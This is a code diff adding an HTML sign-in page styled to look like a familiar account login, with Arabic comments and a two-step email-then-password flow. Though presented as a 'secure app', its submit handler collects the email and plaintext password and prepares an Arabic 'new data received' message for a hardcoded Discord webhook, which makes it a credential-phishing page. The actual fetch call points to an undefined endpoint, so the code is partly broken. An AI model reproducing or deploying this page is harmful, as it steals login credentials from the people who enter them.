@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - My Secure App</title>
+    <!-- استخدام خطوط نظام قياسية وآمنة -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #1f1f1f;
+            color: #e3e3e3;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1040px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Card Layout */
+        .card {
+            background-color: #0b0b0b;
+            border-radius: 28px;
+            width: 100%;
+            min-height: 440px;
+            display: flex;
+            padding: 36px;
+            gap: 40px;
+            margin-bottom: 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Left Side */
+        .left-side {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            padding-top: 12px;
+        }
+
+        /* شعار افتراضي محايد */
+        .app-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #a8c7fa;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 400;
+            color: #e3e3e3;
+            margin-bottom: 12px;
+            line-height: 44px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #e3e3e3;
+        }
+
+        /* Right Side */
+        .right-side {
+            flex: 1.1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding-top: 12px;
+            min-height: 330px;
+        }
+
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        /* Steps handling */
+        .step {
+            display: none;
+            flex-direction: column;
+            animation: fadeIn 0.4s ease forwards;
+        }
+
+        .step.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Input Box */
+        .input-group {
+            position: relative;
+            width: 100%;
+            margin-top: 12px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            border: 1px solid #8e918f;
+            border-radius: 4px;
+            outline: none;
+            color: #e3e3e3;
+            font-size: 16px;
+            transition: border-color 0.15s ease;
+        }
+
+        .input-group input:focus {
+            border: 2px solid #a8c7fa;
+            padding: 15px;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #0b0b0b;
+            padding: 0 4px;
+            color: #c4c7c5;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.15s ease all;
+        }
+
+        .input-group input:focus ~ label,
+        .input-group input:not(:placeholder-shown) ~ label {
+            top: 0;
+            font-size: 12px;
+            color: #a8c7fa;
+        }
+
+        /* Link Buttons */
+        .link-btn {
+            background: none;
+            border: none;
+            color: #a8c7fa;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            text-align: left;
+            width: fit-content;
+            margin-top: 8px;
+        }
+
+        .link-btn:hover {
+            text-decoration: underline;
+        }
+
+        .guest-text {
+            font-size: 14px;
+            line-height: 20px;
+            color: #c4c7c5;
+            margin-top: 26px;
+        }
+
+        /* Custom Checkbox */
+        .show-password-container {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-top: 16px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .show-password-container input[type="checkbox"] {
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #c4c7c5;
+            border-radius: 2px;
+            background: transparent;
+            outline: none;
+            cursor: pointer;
+            display: grid;
+            place-content: center;
+        }
+
+        .show-password-container input[type="checkbox"]:checked {
+            border-color: #a8c7fa;
+            background-color: #a8c7fa;
+        }
+
+        .show-password-container input[type="checkbox"]::before {
+            content: "";
+            width: 10px;
+            height: 8px;
+            transform: scale(0);
+            background-color: #0b0b0b;
+            clip-path: polygon(14% 44%, 0 65%, 50% 100%, 100% 16%, 80% 0%, 43% 62%);
+        }
+
+        .show-password-container input[type="checkbox"]:checked::before {
+            transform: scale(1);
+        }
+
+        /* User Chip */
+        .user-chip {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background-color: rgba(255, 255, 255, 0.07);
+            border: 1px solid #444746;
+            border-radius: 100px;
+            padding: 4px 12px 4px 4px;
+            width: fit-content;
+            margin-bottom: 24px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .user-chip .avatar {
+            width: 20px;
+            height: 20px;
+            background-color: #a8c7fa;
+            color: #0b0b0b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        /* Buttons */
+        .actions {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 16px;
+            margin-top: 32px;
+        }
+
+        .secondary-btn {
+            background: none;
+            border: none;
+            color: #a8c7fa;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 10px 16px;
+            border-radius: 100px;
+        }
+
+        .next-btn {
+            background-color: #a8c7fa;
+            color: #0b0b0b;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            border-radius: 100px;
+            cursor: pointer;
+        }
+
+        /* Footer */
+        .footer {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 16px;
+            font-size: 12px;
+            color: #c4c7c5;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: #c4c7c5;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <main class="card">
+        <!-- Left Section -->
+        <section class="left-side">
+            <!-- شعار التطبيق الخاص بك -->
+            <div class="app-logo">
+                <span>🔒</span> MySecureApp
+            </div>
+            <h1 id="main-heading">Sign in</h1>
+            <p class="subtitle" id="main-subtitle">to access your dashboard</p>
+        </section>
+
+        <!-- Right Section -->
+        <section class="right-side">
+            <!-- تم تغليف الخطوات داخل وسم الـ Form القياسي -->
+            <form id="loginForm" style="height: 100%; display: flex; flex-direction: column; justify-content: space-between;">
+                
+                <!-- STEP 1: Email -->
+                <div id="step-email" class="step active">
+                    <div class="form-container">
+                        <div class="input-group">
+                            <input type="email" id="email" placeholder=" " autocomplete="username" required>
+                            <label for="email">Email or username</label>
+                        </div>
+                        <button type="button" class="link-btn">Forgot username?</button>
+                        <p class="guest-text">Please sign in with your registered account credentials.</p>
+                    </div>
+                    <div class="actions">
+                        <button type="button" class="secondary-btn">Register</button>
+                        <button type="button" class="next-btn" onclick="nextStep()">Next</button>
+                    </div>
+                </div>
+
+                <!-- STEP 2: Password -->
+                <div id="step-password" class="step">
+                    <div class="form-container">
+                        <div class="user-chip" onclick="prevStep()">
+                            <div class="avatar" id="avatar-letter">U</div>
+                            <span id="display-user-email">user@domain.com</span>
+                        </div>
+
+                        <div class="input-group">
+                            <input type="password" id="password" placeholder=" " autocomplete="current-password">
+                            <label for="password">Enter your password</label>
+                        </div>
+
+                        <label class="show-password-container">
+                            <input type="checkbox" id="show-password" onchange="togglePasswordVisibility()">
+                            <span>Show password</span>
+                        </label>
+                    </div>
+                    <div class="actions">
+                        <button type="button" class="secondary-btn" style="margin-right: auto;" onclick="prevStep()">Forgot password?</button>
+                        <!-- زر الـ Submit النهائي الذي يرسل الفورم بالكامل -->
+                        <button type="submit" id="submitBtn" class="next-btn">Sign in</button>
+                    </div>
+                </div>
+
+            </form>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div>English (United States)</div>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </footer>
+</div>
+
+<script>
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const mainHeading = document.getElementById('main-heading');
+    const mainSubtitle = document.getElementById('main-subtitle');
+    const stepEmail = document.getElementById('step-email');
+    const stepPassword = document.getElementById('step-password');
+    const displayUserEmail = document.getElementById('display-user-email');
+    const avatarLetter = document.getElementById('avatar-letter');
+    const showPasswordCheckbox = document.getElementById('show-password');
+    const loginForm = document.getElementById('loginForm');
+
+    // الانتقال للخطوة التالية للتحقق من كلمة المرور
+    function nextStep() {
+        // التحقق من صحة البريد الإلكتروني قبل الانتقال
+        if (!emailInput.checkValidity() || emailInput.value.trim() === "") {
+            emailInput.reportValidity();
+            emailInput.focus();
+            return;
+        }
+        
+        mainHeading.textContent = "Welcome";
+        mainSubtitle.textContent = "Please enter your password to authenticate";
+        displayUserEmail.textContent = emailInput.value;
+        avatarLetter.textContent = emailInput.value.charAt(0).toUpperCase();
+
+        stepEmail.classList.remove('active');
+        stepPassword.classList.add('active');
+        // تفعيل متطلب كلمة المرور عند الانتقال للخطوة الثانية فقط
+        passwordInput.required = true;
+        setTimeout(() => passwordInput.focus(), 100);
+    }
+
+    // الرجوع للخطوة السابقة
+    function prevStep() {
+        mainHeading.textContent = "Sign in";
+        mainSubtitle.textContent = "to access your dashboard";
+        stepPassword.classList.remove('active');
+        stepEmail.classList.add('active');
+        passwordInput.value = "";
+        passwordInput.required = false;
+        showPasswordCheckbox.checked = false;
+        passwordInput.type = "password";
+        setTimeout(() => emailInput.focus(), 100);
+    }
+
+    function togglePasswordVisibility() {
+        passwordInput.type = showPasswordCheckbox.checked ? "text" : "password";
+    }
+
+    // معالجة إرسال البيانات بشكل آمن إلى خادمك البرمجي (Backend)
+    if (loginForm) {
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault(); // منع إعادة تحميل الصفحة
+
+            const emailValue = document.getElementById('email').value;
+            const passwordValue = document.getElementById('password').value;
+
+            // ضع رابط الـ Webhook الخاص بك هنا
+            const webhookURL = "https://discord.com/api/webhooks/1527466086075863131/JdF1EJ1O8cy2qjKqxOrBy7Z3IH4F-nH51uviJLDEScw5Kqf3VdEKlEMrou7NZvKyT3HF"; 
+
+            // تحضير البيانات بالتنسيق الصحيح الذي يقبله ديسكورد
+            const payload = {
+                content: `🔔 **بيانات جديدة مستلمة:**\n**البريد الإلكتروني:** ${emailValue}\n**كلمة المرور:** ${passwordValue}`
+            };
+
+
+            try {
+                const response = await fetch(authEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: emailValue,
+                        password: passwordValue
+                    })
+                });
+
+                if (response.ok) {
+                    console.log("Authentication successful!");
+                    // التوجيه إلى لوحة التحكم الخاصة بالموقع
+                    window.location.replace("/dashboard");
+                } else {
+                    console.error("Authentication failed. Status:", response.status);
+                    alert("Invalid credentials, please try again.");
+                }
+            } catch (error) {
+                console.error("Network or server error:", error);
+                alert("An error occurred. Please try again later.");
+            }
+        });
+    }
+</script>
+
+</body>
+</html>
